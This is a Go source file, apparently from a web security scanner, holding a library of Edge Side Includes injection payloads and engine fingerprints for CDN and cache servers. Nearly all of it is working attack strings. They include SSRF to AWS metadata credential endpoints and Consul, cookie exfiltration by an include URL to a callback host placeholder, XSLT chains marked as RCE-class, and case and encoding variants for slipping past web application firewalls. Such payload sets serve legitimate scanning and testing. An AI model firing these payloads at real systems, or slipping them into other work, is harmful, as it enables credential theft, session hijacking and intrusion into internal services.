// Package esi provides Edge Side Includes (ESI) injection payloads.
//
// ESI is a markup language for assembling dynamic web content at the edge.
// When a user-controlled value is reflected into a response that an edge
// processor parses (Akamai EdgeSuite, Varnish ESI, Fastly ESI, Oracle Web
// Cache, Squid), payloads like `<esi:include src=...>` execute on the edge
// — yielding SSRF (against internal services from the CDN), CRLF-via-cache,
// cookie exfiltration, and in some configurations remote-include RCE.
//
// Mirrors AWVS ESI_Injection.script.
//
// Source: GoSecure 2018 "ESI Injection" paper, OWASP ESI Injection page,
// HackTricks ESI chapter.
package esi

// Payload represents an ESI injection payload.
type Payload struct {
	Value       string
	Marker      string // String to look for in the response body indicating execution.
	Description string
	WAFBypass   bool
}

// EngineFingerprint identifies an ESI processor from response headers
// or the rendered output of a known-safe probe.
type EngineFingerprint struct {
	Engine     string
	Headers    map[string]string // response-header name → substring that must appear in value
	ProbeValue string            // tiny ESI snippet whose rendered form is engine-specific
	ProbeMatch string            // substring expected in the response after rendering ProbeValue
}

// GetPayloads returns the standard ESI injection payloads.
func GetPayloads() []Payload {
	return standardPayloads
}

// GetWAFBypassPayloads returns ESI payloads designed for filter evasion.
func GetWAFBypassPayloads() []Payload {
	return wafBypassPayloads
}

// GetAllPayloads returns standard + WAF-bypass payloads.
func GetAllPayloads() []Payload {
	all := make([]Payload, 0, len(standardPayloads)+len(wafBypassPayloads))
	all = append(all, standardPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// GetEngineFingerprints returns engine identification probes. Use these
// before firing exploit payloads — most ESI engines silently strip
// `<esi:*>` tags they do not understand, so engine ID gates wasted requests.
func GetEngineFingerprints() []EngineFingerprint {
	return engineFingerprints
}

// Standard ESI injection payloads — assume the engine accepts the
// canonical XML-ish ESI syntax.
var standardPayloads = []Payload{
	// Fingerprint / engine probe — debug dump.
	{Value: `<esi:debug/>`, Marker: "<esi:debug", Description: "ESI debug dump (engine fingerprint)"},

	// Variable interpolation — leaks HTTP headers via the cache layer.
	{Value: `<esi:vars>$(HTTP_HOST)</esi:vars>`, Marker: "$(HTTP_HOST)", Description: "ESI vars HTTP_HOST leak"},
	{Value: `<esi:vars>$(HTTP_COOKIE)</esi:vars>`, Description: "ESI vars HTTP_COOKIE leak (cross-victim cookie steal)"},
	{Value: `<esi:vars>$(HTTP_REFERER)</esi:vars>`, Description: "ESI vars HTTP_REFERER leak"},
	{Value: `<esi:vars>$(QUERY_STRING)</esi:vars>`, Description: "ESI vars QUERY_STRING reflection"},

	// SSRF via remote include — the edge fetches and inlines attacker URL.
	{Value: `<esi:include src="http://{OAST_HOST}/esi"/>`, Marker: "{OAST_HOST}", Description: "ESI include SSRF (OAST callback)"},
	{Value: `<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>`, Description: "ESI include SSRF to AWS IMDS"},
	{Value: `<esi:include src="http://localhost:8500/v1/kv/?recurse"/>`, Description: "ESI include SSRF to Consul KV"},

	// Variable assignment + reflection.
	{Value: `<esi:assign name="x" value="poc"/><esi:vars>$(x)</esi:vars>`, Marker: "poc", Description: "ESI assign + vars echo"},

	// Eval — sub-template execution; in Akamai, can chain to extra <esi:include>.
	{Value: `<esi:eval src="http://{OAST_HOST}/esi.xml"/>`, Description: "ESI eval sub-template (SSRF + sub-include chain)"},

	// Exception-class chain — survives engines that strip top-level <esi:*>
	// inside a <esi:try>.
	{Value: `<esi:try><esi:attempt><esi:include src="http://{OAST_HOST}/try"/></esi:attempt><esi:except>esi_try</esi:except></esi:try>`, Marker: "esi_try", Description: "ESI try/attempt/except chain"},

	// Cookie steal via include URL — the entire cookie ends up in attacker
	// access log when the edge inlines.
	{Value: `<esi:include src="http://{OAST_HOST}/?cookie=$(HTTP_COOKIE)"/>`, Description: "ESI cookie exfil via include URL"},

	// Akamai-specific XSLT chain — RCE-class on misconfigured edges.
	{Value: `<esi:include src="http://{OAST_HOST}/x.xml" stylesheet="http://{OAST_HOST}/x.xsl"/>`, Description: "ESI Akamai XSLT include (RCE-class)"},

	// Squid form of include — uses src attribute without scheme.
	{Value: `<esi:include src="/admin"/>`, Description: "ESI Squid same-origin include (internal page fetch)"},
}

// WAF-bypass payloads — encoding and tag-form variants for filter evasion.
var wafBypassPayloads = []Payload{
	// Uppercased tag.
	{Value: `<ESI:INCLUDE src="http://{OAST_HOST}/up"/>`, Description: "ESI uppercase tag", WAFBypass: true},
	// Mixed case.
	{Value: `<EsI:InClUdE src="http://{OAST_HOST}/mc"/>`, Description: "ESI mixed-case tag", WAFBypass: true},
	// HTML-entity encoded angle brackets in src — bypasses tag-presence WAFs.
	{Value: `<esi:include src=&#34;http://{OAST_HOST}/he&#34;/>`, Description: "ESI HTML-entity quote in src", WAFBypass: true},
	// Tab/newline between tag and attribute.
	{Value: "<esi:include\tsrc=\"http://{OAST_HOST}/tab\"/>", Description: "ESI tab-delimited attribute", WAFBypass: true},
	{Value: "<esi:include\nsrc=\"http://{OAST_HOST}/nl\"/>", Description: "ESI newline-delimited attribute", WAFBypass: true},
}

var engineFingerprints = []EngineFingerprint{
	{
		Engine:     "Akamai",
		Headers:    map[string]string{"Server": "AkamaiGHost", "X-Akamai-Transformed": ""},
		ProbeValue: `<esi:debug/>`,
		ProbeMatch: "<esi:debug",
	},
	{
		Engine:     "Varnish",
		Headers:    map[string]string{"Via": "varnish", "X-Varnish": ""},
		ProbeValue: `<esi:vars>$(HTTP_HOST)</esi:vars>`,
		ProbeMatch: "$(HTTP_HOST)",
	},
	{
		Engine:     "Fastly",
		Headers:    map[string]string{"X-Served-By": "cache-", "X-Cache": "HIT"},
		ProbeValue: `<esi:debug/>`,
		ProbeMatch: "<esi:debug",
	},
	{
		Engine:     "Squid",
		Headers:    map[string]string{"X-Cache": "squid", "Via": "squid"},
		ProbeValue: `<esi:vars>$(HTTP_HOST)</esi:vars>`,
		ProbeMatch: "$(HTTP_HOST)",
	},
	{
		Engine:     "Oracle Web Cache",
		Headers:    map[string]string{"Server": "Oracle-Web-Cache"},
		ProbeValue: `<esi:debug/>`,
		ProbeMatch: "<esi:debug",
	},
}
